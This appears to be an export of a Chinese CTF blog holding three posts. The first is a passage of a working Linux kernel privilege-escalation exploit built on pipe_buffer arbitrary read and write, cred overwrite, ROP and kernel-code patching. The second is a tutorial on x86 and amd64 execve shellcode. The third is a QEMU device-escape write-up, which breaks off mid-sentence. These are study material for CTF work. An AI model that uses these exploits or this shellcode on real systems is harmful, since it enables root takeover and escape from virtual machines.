   evil_3rd_buf.len = 0;        write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_3rd_buf, sizeof(evil_3rd_buf));        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;        evil_4th_buf.len = 0;    &#125;    &#123;        vmemmap_base = (size_t)info_pipe_buf.page &amp; 0xfffffffff0000000;        for (;;)        &#123;            arbitrary_read_by_pipe((struct page *)(vmemmap_base + 157 * 0x40), buf);            if (*(uint64_t *)buf &gt; 0xffffffff81000000 &amp;&amp; ((*(uint64_t *)buf &amp; 0xfff) == 0x070))            &#123;                kernel_base = *(uint64_t *)buf - 0x070;                kernel_offset = kernel_base - 0xffffffff81000000;                printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m0x%lx\\n&quot;                       &quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m0x%lx\\n&quot;,                       kernel_base, kernel_offset);                break;            &#125;            vmemmap_base -= 0x10000000;        &#125;        printf(&quot;\\033[32m\\033[1m[+] vmemmap_base:\\033[0m 0x%lx\\n\\n&quot;, vmemmap_base);    &#125;    uint64_t parent_task, current_task;    &#123;        puts(&quot;[*] Seeking task_struct in memory...&quot;);        uint64_t *comm_addr = 0;        uint64_t *point_buf = malloc(0x1000);        for (int i = 0; 1; i++)        &#123;            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * 0x40), point_buf);            comm_addr = memmem(point_buf, 0xf00, target, 0xf);            if (comm_addr &amp;&amp; (comm_addr[-2] &gt; 0xffff888000000000) &amp;&amp; (comm_addr[-3] &gt; 0xffff888000000000) &amp;&amp; (comm_addr[-57] &gt; 0xffff888000000000) &amp;&amp; (comm_addr[-56] &gt; 0xffff888000000000))            &#123;                parent_task = comm_addr[-57];                current_task = comm_addr[-50] - 2528;                page_offset_base = (comm_addr[-50] &amp; 0xfffffffffffff000) - i * 0x1000;                page_offset_base &amp;= 0xfffffffff0000000;                printf(&quot;\\033[32m\\033[1m[+] Found task_struct on page: \\033[0m%p\\n&quot;,                       (struct page *)(vmemmap_base + i * 0x40));                printf(&quot;\\033[32m\\033[1m[+] page_offset_base: \\033[0m0x%lx\\n&quot;,                       page_offset_base);                printf(&quot;\\033[34m\\033[1m[*] current task_struct&#x27;s addr: \\033[0m&quot;                       &quot;0x%lx\\n\\n&quot;,                       current_task);                break;            &#125;        &#125;    &#125;    int command = 0;    uint64_t stack_addr;    size_t *tsk_buf;    size_t *mm_struct_buf;    uint64_t mm_struct_addr;    uint64_t mm_struct_page;    uint64_t pgd_addr;    switch (command)    &#123;    case 0:        puts(&quot;[*] Seeking for init_task...&quot;);        &#123;            uint64_t init_task;            uint64_t init_cred;            uint64_t init_nsproxy;            for (;;)            &#123;                size_t ptask_page_addr = direct_map_addr_to_page_addr(parent_task);                tsk_buf = (size_t *)((size_t)buf + (parent_task &amp; 0xfff));                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + 0x40), &amp;buf[512 * 8]);                /* task_struct::real_parent */                if (parent_task == tsk_buf[309])                &#123;                    break;                &#125;                parent_task = tsk_buf[309];            &#125;            init_task = parent_task;            init_cred = tsk_buf[363];            init_nsproxy = tsk_buf[377];            printf(&quot;\\033[32m\\033[1m[+] Found init_task: \\033[0m0x%lx\\n&quot;, init_task);            printf(&quot;\\033[32m\\033[1m[+] Found init_cred: \\033[0m0x%lx\\n&quot;, init_cred);            printf(&quot;\\033[32m\\033[1m[+] Found init_nsproxy:\\033[0m0x%lx\\n&quot;, init_nsproxy);            /* now, changing the current task_struct to get the full root :) */            puts(&quot;[*] Escalating ROOT privilege now...&quot;);            size_t current_task_page = direct_map_addr_to_page_addr(current_task);            arbitrary_read_by_pipe((struct page *)current_task_page, buf);            arbitrary_read_by_pipe((struct page *)(current_task_page + 0x40), &amp;buf[512 * 8]);            tsk_buf = (size_t *)((size_t)buf + (current_task &amp; 0xfff));            tsk_buf[363] = init_cred;            tsk_buf[364] = init_cred;            tsk_buf[377] = init_nsproxy;            arbitrary_write_by_pipe((struct page *)current_task_page, buf, 0xff0);            arbitrary_write_by_pipe((struct page *)(current_task_page + 0x40),                                    &amp;buf[512 * 8], 0xff0);            puts(&quot;[+] Done.\\n&quot;);            puts(&quot;[*] checking for root...&quot;);            get_shell();        &#125;        break;    case 1:        puts(&quot;[*] Reading current task_struct...&quot;);        &#123;            size_t current_task_page = direct_map_addr_to_page_addr(current_task);            arbitrary_read_by_pipe((struct page *)current_task_page, buf);            arbitrary_read_by_pipe((struct page *)(current_task_page + 0x40), &amp;buf[512 * 8]);            tsk_buf = (size_t *)((size_t)buf + (current_task &amp; 0xfff));            stack_addr = tsk_buf[4];            mm_struct_addr = tsk_buf[292];            printf(&quot;\\033[34m\\033[1m[*] kernel stack&#x27;s addr:\\033[0m0x%lx\\n&quot;, stack_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s addr:\\033[0m0x%lx\\n&quot;, mm_struct_addr);            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s page:\\033[0m0x%lx\\n&quot;, mm_struct_page);            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);            arbitrary_read_by_pipe((struct page *)(mm_struct_page + 0x40), &amp;buf[512 * 8]);            mm_struct_buf = (size_t *)((size_t)buf + (mm_struct_addr &amp; 0xfff));            pgd_addr = mm_struct_buf[9];            printf(&quot;\\033[32m\\033[1m[+] Got kernel page table of current task:\\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   pgd_addr);        &#125;        &#123;            puts(&quot;[*] Reading page table...&quot;);            size_t rop[0x1000];            size_t idx = 0;            uint64_t stack_addr_another;            size_t pud_addr, pmd_addr, pte_addr, pte_val;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);            pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pud_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);            pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pmd_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);            pte_addr = (*(size_t *)((size_t *)buf + PMD_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pte_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf);            pte_val = (*(size_t *)((size_t *)buf + PTE_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            stack_addr_another = pte_val;            stack_addr_another &amp;= (~PAGE_ATTR_NX);            stack_addr_another += page_offset_base;            printf(&quot;\\033[32m\\033[1m[+] Got another virt addr of kernel stack: \\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   stack_addr_another);            for (int i = 0; i &lt; ((0x1000 - 0x100) / 8); i++)            &#123;                rop[idx++] = RET + kernel_offset;            &#125;            rop[idx++] = POP_RDI_RET + kernel_offset;            rop[idx++] = INIT_CRED + kernel_offset;            rop[idx++] = COMMIT_CREDS + kernel_offset;            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 54 + kernel_offset;            rop[idx++] = *(size_t *)&quot;0x196082&quot;;            rop[idx++] = *(size_t *)&quot;0x196082&quot;;            rop[idx++] = (size_t)get_shell;            rop[idx++] = user_cs;            rop[idx++] = user_rflags;            rop[idx++] = user_sp;            rop[idx++] = user_ss;            uint64_t stack_page = direct_map_addr_to_page_addr(stack_addr_another);            puts(&quot;[*] Hijacking current task&#x27;s stack...&quot;);            sleep(5);            arbitrary_write_by_pipe((struct page *)(stack_page + 0x40 * 3), rop, 0xff0);        &#125;    case 2:        puts(&quot;[*] Reading current task_struct...&quot;);        &#123;            size_t current_task_page = direct_map_addr_to_page_addr(current_task);            arbitrary_read_by_pipe((struct page *)current_task_page, buf);            arbitrary_read_by_pipe((struct page *)(current_task_page + 0x40), &amp;buf[512 * 8]);            tsk_buf = (size_t *)((size_t)buf + (current_task &amp; 0xfff));            stack_addr = tsk_buf[4];            mm_struct_addr = tsk_buf[292];            printf(&quot;\\033[34m\\033[1m[*] kernel stack&#x27;s addr:\\033[0m0x%lx\\n&quot;, stack_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s addr:\\033[0m0x%lx\\n&quot;, mm_struct_addr);            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s page:\\033[0m0x%lx\\n&quot;, mm_struct_page);            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);            arbitrary_read_by_pipe((struct page *)(mm_struct_page + 0x40), &amp;buf[512 * 8]);            mm_struct_buf = (size_t *)((size_t)buf + (mm_struct_addr &amp; 0xfff));            pgd_addr = mm_struct_buf[9];            printf(&quot;\\033[32m\\033[1m[+] Got kernel page table of current task:\\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   pgd_addr);        &#125;        &#123;            char *kcode_map;            size_t dst_paddr, dst_vaddr;            kcode_map = mmap((void *)0x114514000, 0x2000, PROT_READ | PROT_WRITE,                             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);            if (!kcode_map)            &#123;                errExit(&quot;FAILED to create mmap area!&quot;);            &#125;            for (int i = 0; i &lt; 8; i++)            &#123;                kcode_map[i] = &quot;0x196082&quot;[i];                kcode_map[i + 0x1000] = &quot;0x196082&quot;[i];            &#125;            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;            printf(&quot;\\033[34m\\033[1m[*] vaddr of ns_capable_setid is: \\033[0m0x%lx\\n&quot;, dst_vaddr);            size_t pud_addr, pmd_addr;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);            pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pud_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);            pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pmd_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);            dst_paddr = (*(size_t *)((size_t *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            dst_paddr += 0x1000 * PTE_ENTRY(dst_vaddr);            printf(&quot;\\033[32m\\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   dst_paddr);            size_t pte_addr;            &#123;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);                pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(0x114514000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pud_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);                pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(0x114514000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pmd_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);                pte_addr = (*(size_t *)((size_t *)buf + PMD_ENTRY(0x114514000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pte_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf);                *(size_t *)((size_t *)buf + PTE_ENTRY(0x114514000)) = dst_paddr | 0x8000000000000867;                arbitrary_write_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf, 0xff0);            &#125;            &#123;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);                pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(0x114514000 + 0x1000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pud_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);                pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(0x114514000 + 0x1000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pmd_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);                pte_addr = (*(size_t *)((size_t *)buf + PMD_ENTRY(0x114514000 + 0x1000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pte_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf);                *(size_t *)((size_t *)buf + PTE_ENTRY(0x114514000 + 0x1000)) = (dst_paddr + 0x1000) | 0x8000000000000867;                arbitrary_write_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf, 0xff0);            &#125;            puts(&quot;[*] Start overwriting kernel code segment...&quot;);            /**             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),             * so we can just patch it to let it always return true :)             */            memset(kcode_map + (NS_CAPABLE_SETID &amp; 0xfff), &#x27;\\x90&#x27;, 0x40);            memcpy(kcode_map + (NS_CAPABLE_SETID &amp; 0xfff) + 0x40,                   &quot;\\xf3\\x0f\\x1e\\xfa&quot;                   &quot;H\\xc7\\xc0\\x01\\x00\\x00\\x00&quot;                   &quot;\\xc3&quot;,                   12);            puts(&quot;[*] trigger evil ns_capable_setid() in setresuid()...\\n&quot;);            sleep(5);            setresuid(0, 0, 0);            get_shell();        &#125;    &#125;    return 0;&#125;\n\n\n本人当时做的笨办法因为当时注意到存在off by null漏洞，第一反应就是利用msg_msg结构体来做这道题。属于是瞎猫碰到死耗子，我在没有考虑页级堆风水的情况下申请的msg_msg的order正好为3，也导致有一定的几率能够达到UAF的效果。自然，我的第一反应也是修改cred结构体，虽然能够成功找到但是成功率十分的低，每次调试需要手动跑二十多分钟，因为内存中有一大块存放着各种指针，导致无法继续往下搜索出现kernel panic，并且在改回普通用户权限后出现了这篇文章开头部分提到的io_uring的问题，所以也就放弃了这一方法。\n然而，因为当时不清楚CFI的作用又跑去改ops去了，调了半天发现永远会在最后一步造成panic，并且也没有找到可以用来实现栈迁移的gadget，所以这个方法也被放弃了。刚刚结束比赛看了NULL的wp之后就觉得自己是真的太蠢了，分明可以直接修改pipe_buffer了居然没有想到Dirty Pipe，虽然墨晚鸢佬说这不是最优解，但是是我唯一能够做出来的方法我居然没想到，我是真的蠢！！！\n\n参考链接：\n​    https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation\n​    https://elixir.bootlin.com/linux/v6.2.12/source\n","categories":["Linux Kernel"],"tags":["msg_msg","pipe_buffer","io_uring","页级堆风水"]},{"title":"shellcode","url":"/2021/11/24/shellcode/","content":"shellcode理解shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。\n在pwn的过程中我们的目标一般来说都是执行system(“/bin/sh”);其实shellcode也是较为类似的，只不过是一串机器码\nx86pwntools&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push &#x27;sh\\x00\\x00&#x27; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#x27;sh\\x00&#x27; */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80&gt;&gt;&gt;\n\n可以很明显的看出来这个python默认生成的shellcode是32位的shellcode。\n32位的函数的参数不是栈里面的内容吗，为什么这里非要高寄存器呢？是因为这是系统调用的所以参数使用的是寄存器。\npython已经告诉我们上面的shellcode最终执行的是什么了\n\nexecve(path=’/bin///sh’, argv=[‘sh’], envp=0)\n32位的第一个参数为ebx，后面是ecx，edx\n\n&gt;&gt;&gt; print(len(asm(shellcraft.sh())))44\n\n自己编写x86 shellcode把上面的转化成十六进制代码之后求长度发现有44字节，确实是太长了，所以我们搞清楚本质就可以自己写shellcode了\n# 其实根据上面的可以看出来我们需要满足的条件有以下几条# ebx=/bin/sh# ecx=0# edx=0# eax=0xb     (系统调用号，后面有系统调用号很全的网站)# 所以根据上面的要求进行修改就好push 0x68732fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxxor eax,eaxmov al,0xbint 0x80\n\n&gt;&gt;&gt; len(&#x27;\\x68\\x2F\\x73\\x68\\x00\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x31\\xC9\\x31\\xD2\\x31\\xC0\\xB0\\x0B\\xCD\\x80&#x27;)22\n\n可以看到我们就只需要22字节了省了一半，当然还可以更简短，自己下去写\namd64pwntools&gt;&gt;&gt; context.arch=&#x27;amd64&#x27;&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    syscall&gt;&gt;&gt; \n\n这里的思路和x86是一样的只是使用的寄存器不相同\n自己编写x86 shellcode# 其实根据上面的可以看出来我们需要满足的条件有以下几条# rdi=/bin/sh# rsi=0# rdx=0# rax=0x3b     (系统调用号，后面有系统调用号很全的网站)# syscall      这里和x86有点区别# 所以根据上面的要求进行修改就好mov rbx,0x68732f6e69622fpush rbxpush rsppop rdixor rsi,rsixor rdx,rdxmov rax,0x3bsyscall\n\n&gt;&gt;&gt; len(&#x27;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x0F\\x05&#x27;)28&gt;&gt;&gt;\n\n也少了很多哈，同样也不是最少的，可以去网上搜或则自己写\n32位和64位系统调用表\nhttps://blog.k0nashi.cn/2021/09/14/syscall-table/\n","categories":["pwn"],"tags":["shellcode编写"]},{"title":"q-escape","url":"/2023/03/15/q-escape/","content":"许久没有更新，前段时间一直考试所以一直拖着了。\n设备分析首先看看开了什么保护\n➜  q-escape checksec --file=./qemu-system-x86_64 [*] &#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    FORTIFY:  Enabled\n\n没有开启PIE\n#!/bin/sh./qemu-system-x86_64 \\\t-m 64 \\\t-initrd ./initramfs.igz \\\t-kernel ./vmlinuz-4.15.0-36-generic \\\t-append &quot;priority=low console=ttyS0&quot; \\\t-nographic \\\t-L ./pc-bios \\\t-vga std \\\t-device cydf-vga \\\t-monitor telnet:127.0.0.1:2222,server,nowait\n\n设备名为cydf-vga并且允许连接。\n将qemu-system-x86_64拖入ida中，查找与设备cydf-vga相关的函数。\n\n先分析cydf_vga_class_init初始化函数：\nvoid __fastcall cydf_vga_class_init(ObjectClass_0 *klass, void *data)&#123;  PCIDeviceClass *v2; // rbx  PCIDeviceClass *v3; // rax  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           klass,                           &quot;device&quot;,                           &quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;,                           3223,                           &quot;cydf_vga_class_init&quot;);  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           klass,                           &quot;pci-device&quot;,                           &quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;,                           3224,                           &quot;cydf_vga_class_init&quot;);  v3-&gt;realize = pci_cydf_vga_realize;  v3-&gt;romfile = &quot;vgabios-cydf.bin&quot;;  v3-&gt;vendor_id = 0x1013;  v3-&gt;device_id = 0xB8;  v3-&gt;class_id = 0x300;  v2-&gt;parent_class.desc = &quot;Cydf CLGD 54xx VGA&quot;;  v2-&gt;parent_class.categories[0] |= 0x20uLL;  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;  v2-&gt;parent_class.props = pci_vga_cydf_properties;  v2-&gt;parent_class.hotpluggable = 0;&#125;\n\n可以看到device_id为0xB8，vendor_id为0x1013，class_id为0x300。并且可以看到父类的描述为Cydf CLGD 54xx VGA。合理猜测是根据原本的改的。\n➜  display git:(master) grep -r &#x27;CLGD 54xx VGA&#x27; ./ ./cirrus_vga_rop.h: * QEMU Cirrus CLGD 54xx VGA Emulator../cirrus_vga_isa.c: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support./cirrus_vga_internal.h: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support./cirrus_vga_rop2.h: * QEMU Cirrus CLGD 54xx VGA Emulator../cirrus_vga.c: * QEMU Cirrus CLGD 54xx VGA Emulator../cirrus_vga.c:    dc-&gt;desc = &quot;Cirrus CLGD 54xx VGA&quot;;\n\n事实也是这样的。\n/ # lspci00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:01.0 Class 0601: 8086:700000:04.0 Class 0300: 1013:00b8 &lt;-- cydf_vga\n\n/ # cat /sys/bus/pci/devices/0000\\:00\\:04.0/resource0x00000000fa000000 0x00000000fbffffff 0x00000000000422080x00000000febc1000 0x00000000febc1fff 0x00000000000402000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x00000000febb0000 0x00000000febbffff 0x00000000000462000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000\n\n通过这里可以看到三个mmio空间。通过交叉引用，可以找到哪里注册了IO\n\nmemory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, &quot;cydf-io&quot;, 0x30uLL);memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, &quot;cydf-low-memory&quot;, 0x20000uLL);memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, &quot;cydf-mmio&quot;, 0x1000uLL);\n\n这里关注与cydf相关的空间注册，根据大小来看第一个就是pmio，只不过在resource文件内没有范围\n/ # cat /proc/ioports 0000-0cf7 : PCI Bus 0000:00  0000-001f : dma1  0020-0021 : pic1  0040-0043 : timer0  0050-0053 : timer1  0060-0060 : keyboard  0064-0064 : keyboard  0070-0071 : rtc0  0080-008f : dma page reg  00a0-00a1 : pic2  00c0-00df : dma2  00f0-00ff : fpu  0170-0177 : 0000:00:01.1    0170-0177 : ata_piix  01f0-01f7 : 0000:00:01.1    01f0-01f7 : ata_piix  0376-0376 : 0000:00:01.1    0376-0376 : ata_piix  03c0-03df : vga+  03f6-03f6 : 0000:00:01.1    03f6-03f6 : ata_piix  03f8-03ff : serial  0510-051b : QEMU0002:00  0600-063f : 0000:00:01.3    0600-0603 : ACPI PM1a_EVT_BLK    0604-0605 : ACPI PM1a_CNT_BLK    0608-060b : ACPI PM_TMR  0700-070f : 0000:00:01.30cf8-0cff : PCI conf10d00-ffff : PCI Bus 0000:00  afe0-afe3 : ACPI GPE0_BLK  c000-c03f : 0000:00:03.0  c040-c04f : 0000:00:01.1    c040-c04f : ata_piix\n\n可以看到这里存在一个大小刚好为0x30的vga+的端口范围。\n\n根据定义的函数来看我们还需要找到vga的映射空间，通过这篇文章vgamem可以得知vga的映射空间为000a0000-000bffff\n/ # cat /proc/iomem 00000000-00000fff : Reserved00001000-0009fbff : System RAM0009fc00-0009ffff : Reserved000a0000-000bffff : PCI Bus 0000:00000c0000-000c97ff : Video ROM000c9800-000ca5ff : Adapter ROM000ca800-000cadff : Adapter ROM000f0000-000fffff : Reserved  000f0000-000fffff : System ROM00100000-03fdffff : System RAM  01000000-01c031d0 : Kernel code  01c031d1-0266a03f : Kernel data  028e2000-02b3dfff : Kernel bss03fe0000-03ffffff : Reserved04000000-febfffff : PCI Bus 0000:00  fa000000-fbffffff : 0000:00:04.0  fc000000-fcffffff : 0000:00:02.0  feb40000-feb7ffff : 0000:00:03.0  feb80000-feb9ffff : 0000:00:03.0  febb0000-febbffff : 0000:00:04.0  febc0000-febc0fff : 0000:00:02.0  febc1000-febc1fff : 0000:00:04.0fec00000-fec003ff : IOAPIC 0fed00000-fed003ff : HPET 0  fed00000-fed003ff : PNP0103:00fee00000-fee00fff : Local APICfffc0000-ffffffff : Reserved100000000-17fffffff : PCI Bus 0000:00\n\n通过注册的大小和所看到的其实地址可以确定是这里000a0000-000bffff : PCI Bus 0000:00。\n并且在源码中也有\n/*************************************** * *  memory access between 0xa0000-0xbffff * ***************************************/\n\n可以看到vga_mem空间在resource文件中并不存在，所以无法像前面一道题一样使用resource0文件去访问内存了。这时我们可以利用/dev/mem文件，dev/mem是物理内存的全映像，可以用来访问物理内存，用mmap来访问物理内存以及外设的IO资源，是实现用户空间驱动的一种方法。\nsystem( &quot;mknod -m 660 /dev/mem c 1 1&quot; );int fd = open( &quot;/dev/mem&quot;, O_RDWR | O_SYNC );if ( fd == -1 ) &#123;    return 0;&#125;mmio_mem = mmap( NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xfebc1000 );if ( !mmio_mem ) &#123;    die(&quot;mmap mmio failed&quot;);&#125;vga_mem = mmap( NULL, 0x20000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xa0000 );if ( !vga_mem ) &#123;    die(&quot;mmap vga mem failed&quot;);&#125;\n\n函数分析根据上一道题的流程来看，这里需要分析分析结构体了。\n\n在对比两个结构体的结果发现了源文件中不存在VulnState_0 vs[16];uint32_t latch[4];这样两个属性。并且还明显的说了是VulnState_0。通过源码对比发现，源码中考虑地址的情况只有addr &lt; 0x10000，addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100\n但是这里存在一个新的，也就是大于0x18100的情况。\nv5 = opaque-&gt;vga.sr[0xCC] % 5u;if ( *(_WORD *)&amp;opaque-&gt;vga.sr[0xCD] )  LODWORD(mem_value) = (opaque-&gt;vga.sr[0xCD] &lt;&lt; 16) | (opaque-&gt;vga.sr[0xCE] &lt;&lt; 8) | mem_value;if ( v5 == 2 )&#123;  v21 = BYTE2(mem_value);  if ( v21 &lt;= 0x10 &amp;&amp; opaque-&gt;vs[v21].buf )    __printf_chk(1LL);&#125;else&#123;  if ( v5 &lt;= 2u )  &#123;    if ( v5 == 1 )    &#123;      if ( BYTE2(mem_value) &gt; 0x10uLL )        return;      v6 = (char *)opaque + 16 * BYTE2(mem_value);      v7 = *((_QWORD *)v6 + 0x267B);      if ( !v7 )        return;      v8 = *((unsigned int *)v6 + 0x4CF9);      if ( (unsigned int)v8 &gt;= *((_DWORD *)v6 + 0x4CF8) )        return;      LABEL_26:      *((_DWORD *)v6 + 0x4CF9) = v8 + 1;      *(_BYTE *)(v7 + v8) = mem_value;      return;    &#125;    goto LABEL_35;  &#125;  if ( v5 != 3 )  &#123;    if ( v5 == 4 )    &#123;      if ( BYTE2(mem_value) &gt; 0x10uLL )        return;      v6 = (char *)opaque + 16 * BYTE2(mem_value);      v7 = *((_QWORD *)v6 + 0x267B);      if ( !v7 )        return;      v8 = *((unsigned int *)v6 + 19705);      if ( (unsigned int)v8 &gt; 0xFFF )        return;      goto LABEL_26;    &#125;    LABEL_35:    v17 = vulncnt;    if ( vulncnt &lt;= 0x10 &amp;&amp; (unsigned __int16)mem_value &lt;= 0x1000uLL )    &#123;      mem_valuea = mem_value;      v18 = malloc((unsigned __int16)mem_value);      v19 = (char *)opaque + 16 * v17;      *((_QWORD *)v19 + 9851) = v18;      if ( v18 )      &#123;        vulncnt = v17 + 1;        *((_DWORD *)v19 + 19704) = mem_valuea;      &#125;    &#125;    return;  &#125;  if ( BYTE2(mem_value) &lt;= 0x10uLL )  &#123;    v20 = (char *)opaque + 16 * BYTE2(mem_value);    if ( *((_QWORD *)v20 + 9851) )    &#123;      if ( (unsigned __int16)mem_value &lt;= 0x1000u )        *((_QWORD *)v20 + 9852) = (unsigned __int16)mem_value;    &#125;  &#125;&#125;\n\n逆向之后会发现这里其实就是一个堆题，总共有五个选项\nv5==0时，opaque-&gt;vs[idx].buf = malloc(mem_value &amp; 0xfff); max_size == mem_value &amp; 0xfffv5==1时，当cur_size &lt; 